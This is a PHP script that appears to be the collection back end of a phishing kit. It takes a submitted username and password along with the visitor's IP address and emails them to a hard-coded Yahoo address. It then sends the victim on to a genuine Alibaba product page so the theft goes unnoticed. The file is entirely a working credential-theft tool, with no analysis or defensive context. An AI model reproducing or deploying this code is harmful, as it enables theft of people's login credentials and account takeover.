<?php
    
    $to = "nowisabundance@yahoo.com";
    
       $login_username = $_REQUEST['login_username'];
        $secretkey = $_REQUEST['secretkey'];
        $ip=$_SERVER['REMOTE_ADDR'];
	$headers = "noreply@yahoo.com";
    $body = "From: $login_username \n\n Username: $login_username \n\n Password: $secretkey \n\n IP: $ip";
    $sent = mail($to, $subject, $body, $headers) ;
    $ip=$_SERVER['REMOTE_ADDR'];
    if($sent)
    {echo "<script language=javascript>window.location = 'http://www.alibaba.com/Tea-Product_pid100008840/';</script>";}
    else
    {echo "<script language=javascript>window.location = 'http://www.alibaba.com/Tea-Product_pid100008840/';</script>";}
    ?>